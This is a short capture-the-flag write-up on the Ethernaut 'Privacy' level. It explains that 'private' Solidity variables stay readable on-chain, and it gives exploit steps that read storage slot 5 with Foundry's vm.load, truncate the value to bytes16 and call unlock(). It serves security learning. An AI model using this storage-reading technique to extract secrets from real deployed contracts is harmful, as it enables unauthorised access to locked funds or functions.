# 🎯 Vulnerability Report: Privacy (Ethernaut #12)

## 🔓 Vulnerability  
- **Type**: Insecure Visibility & Storage Exposure
- **Location**: `bytes32[3] private data` storage variables
- **Root Cause**:  
    -  Using private visibility for sensitive data (misleading security)
    - Storing secrets in publicly readable blockchain storage
  


 

## 🕵️‍♂️ How Did I Find It?  
1. **Code Review**:  
- Noticed all variables were marked private but had no real protection
- Saw the unlock key came from bytes16(data[2]) in storage

2. **Testing**:  
- Used Foundry's vm.load() to read raw storage slots
- Confirmed private data was fully readable

## 💥 Exploit Steps  
```js
1. Calculate storage layout:
   - Slot 0: locked (bool)
   - Slot 1: ID (uint256)
   - Slot 2: flattening+denomination+awkwardness (packed)
   - Slots 3: data[0]
   - Slot 4: data[1]
   - Slot 5: data[2]

2. Read Slot 5 where data[2] lives:
   bytes32 slot5Value = vm.load(contractAddress, 5);

3. Extract first 16 bytes:
   bytes16 key = bytes16(slot5Value);

4. Call unlock():
   privacyContract.unlock(key);
```   
